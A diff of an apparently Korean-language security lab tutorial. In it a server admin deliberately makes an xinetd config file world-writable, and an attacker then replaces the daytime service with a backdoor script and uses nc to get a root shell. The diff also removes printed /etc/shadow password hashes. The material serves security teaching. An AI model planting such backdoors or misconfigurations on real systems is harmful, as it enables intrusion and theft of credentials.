@@ -7,11 +7,13 @@
 **[취약한 리눅스 서버 관리자] 취약한 시스템을 만듭시다!**
 
 1. 우선 슈퍼 데몬인 `xinetd`를 설치합니다.
+
 ```
 cju@wooam:~$ sudo apt install xinetd
 ```
 
 2. `xinetd.conf` 파일의 접근 권한을 살펴봅시다.
+
 ```
 cju@wooam:~$ ls -l /etc/xinet.conf
 ```
@@ -37,12 +39,14 @@ includedir /etc/xinetd.d
 ```
 
 4. `/etc/xinetd.d` 디렉토리를 살펴봅시다.
+
 ```
 cju@wooam:~$ ls /etc/xinetd.d/
 chargen  chargen-udp  daytime  daytime-udp  discard  discard-udp  echo  echo-udp  servers  services  time  time-udp
 ```
 
 5. `/etc/xinetd.d` 디렉터리 파일 중 하나의 접근 권한을 `-rw-rw-rw-`로 변경합니다. 여기서는 `daytime`의 접근 권한을 변경합니다.
+
 ```
 cju@wooam:~$ sudo chmod 666 /etc/xinetd.d/daytime
 ```
@@ -52,11 +56,13 @@ cju@wooam:~$ sudo chmod 666 /etc/xinetd.d/daytime
 > 공격자가 취약한 리눅스 서버에 일반 사용자 계정으로 접속했다고 가정합니다.
 
 6. `xinetd` 관련 파일의 접근 권한을 살펴봅시다. `/etc/xinetd.d/daytime` 파일을 아무나 수정할 수 있음을 발견합니다.
+
 ```
 aaa@wooam:~$ ls -l /etc/xinetd.conf /etc/xinetd.d
 ```
 
 7. 아래와 같이 간단한 백도어를 만듭니다.
+
 ```
 aaa@wooam:~$ cat hola
 #!/bin/bash
@@ -66,11 +72,13 @@ echo "Thanks you for using this backdoor!"
 ```
 
 8. 만든 백도어 파일에 실행 권한을 부여합니다.
+
 ```
 aaa@wooam:~$ chmod 755 hola
 ```
 
 9. `/etc/xinetd.d/daytime` 파일을 아래와 같이 수정합니다. `disable = no`로 수정하고 `type = INTERNAL` 라인은 삭제합니다. 그리고 `server = /home/aaa/hola`를 추가합니다.
+
 ```
 aaa@wooam:~$ cat /etc/xinetd.d/daytime
 # default: off
@@ -103,6 +111,7 @@ service daytime
 ```
 
 10. `xinetd` 서비스가 재시작되었다고 가정합니다.
+
 ```
 cju@wooam:~$ sudo systemctl restart xinetd
 ```
@@ -110,6 +119,7 @@ cju@wooam:~$ sudo systemctl restart xinetd
 **[공격자] `daytime` 백도어를 통해 자유롭게 시스템을 사용합니다!!!**
 
 11. `nc` 명령어를 이용하여 백도어에 접근합니다.
+
 ```
 ┌──(kali㉿kali)-[~]
 └─$ nc -v 192.168.xxx.xxx 13
@@ -120,6 +130,7 @@ root
 ```
 
 12. 셸도 실행 가능합니다!
+
 ```
 ┌──(kali㉿kali)-[~]
 └─$ nc -v 192.168.xxx.xxx 13
@@ -128,16 +139,5 @@ root
 sh
 pwd
 /
-tail /etc/shadow
-saned:*:19411:0:99999:7:::
-colord:*:19411:0:99999:7:::
-geoclue:*:19411:0:99999:7:::
-pulse:*:19411:0:99999:7:::
-gnome-initial-setup:*:19411:0:99999:7:::
-hplip:*:19411:0:99999:7:::
-gdm:*:19411:0:99999:7:::
-cju:$y$j9T$yeQ4tioqxJ7oL38.L4j6e/$oAaCPWRn0yIwLOdn5UeYEOXG4ODWzQd/Dqn.e.g1Fu5:19425:0:99999:7:::
-aaa:$y$j9T$wk9l0Wr4Y5gUub6/OsP8K1$2hzQYlTlOeX0WfXxUxpfb4dWItOB0c/UrZzoPej8cE8:19439:0:99999:7:::
-sshd:*:19439:0:99999:7:::
 exit
 ```
